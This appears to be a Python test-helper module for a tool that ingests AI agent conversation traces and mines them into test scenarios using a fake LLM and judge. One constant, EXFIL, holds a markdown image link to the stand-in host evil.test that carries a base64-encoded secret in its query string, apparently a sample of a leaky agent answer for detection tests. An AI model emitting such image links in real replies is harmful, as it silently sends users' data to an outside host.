"""Helpers for the mining tests: conversations ingested through the real OTLP route."""

from __future__ import annotations

import json
from typing import Any

from gauntlet_core.llm import FakeLLM, FakeReply
from ingest_helpers import build, post
from policy_helpers import run_queue

EXFIL = "Here you go ![x](http://evil.test/p?d=c2VjcmV0LXZhbHVlLXN0cmluZw)"


def chat_doc(session: str, turns: list[tuple[str, str]], tool: dict[str, Any] | None = None):
    """`turns` are (user text, agent text) pairs; `tool` adds one lookup between turn 0's
    question and its answer: {"name", "args", "result"}."""
    b = build()
    t = (session.encode().hex() + "0" * 32)[:32]
    spans, history, n, clock = [], [], 0, 0
    for i, (user, agent) in enumerate(turns):
        history.append(("user", user))
        attrs = {"openinference.span.kind": "LLM", "session.id": session}
        attrs.update(b.oi_llm({k: v for k, v in enumerate(history)}, ("assistant", agent)))
        if i == 0 and tool:
            call = {
                "openinference.span.kind": "TOOL",
                "tool.name": tool["name"],
                "tool.parameters": json.dumps(tool["args"]),
                "output.value": tool["result"],
            }
            spans.append(b.span(t, f"t{n:015x}", tool["name"], clock, clock + 5, call))
            n += 1
            clock += 10
        spans.append(b.span(t, f"s{n:015x}", "llm", clock, clock + 5, attrs))
        n += 1
        clock += 10
        history.append(("assistant", agent))
    return b.doc(spans)


async def ingest(client, doc, agent_id: str):
    r = await post(client, doc, agent_id=agent_id)
    assert r.status_code == 200, r.text


def mining_llm(draft: dict[str, Any] | None = None, judge_fail: str | None = None) -> FakeLLM:
    """generator: names clusters and writes scenario drafts (told apart by the prompt);
    judge_small: fails any transcript containing `judge_fail`."""

    def generator(messages):
        system = messages[0]["content"]
        if "name groups" in system.lower():
            return FakeReply(
                parsed={"name": "Leaky answers", "description": "d", "suspected_cause": "c"}
            )
        return FakeReply(parsed=draft or {
            "title": "Order status", "goal": "The customer wants to know where their order is.",
            "hidden_facts": ["The order was placed last week."],
            "opening_message": "Hello, where is my order?"})  # fmt: skip

    def judge(messages):
        bad = judge_fail is not None and judge_fail in messages[-1]["content"]
        return FakeReply(parsed={"result": "fail" if bad else "pass"})

    from gauntlet_core.schema import Cost

    return FakeLLM(
        by_role={"generator": [generator] * 40, "judge_small": [judge] * 40},
        default_cost=Cost(usd_micros=100),
    )


async def mine(client, state, agent_id: str, **body) -> dict[str, Any]:
    body = {"agent_id": agent_id, "budget_usd_micros": 10_000, **body}
    r = await client.post("/v1/production/mine", json=body)
    assert r.status_code == 202, r.text
    await run_queue(state)
    job = (await client.get(f"/v1/jobs/{r.json()['job_id']}")).json()
    assert job["status"] == "done", job
    return {**r.json(), "job": job}
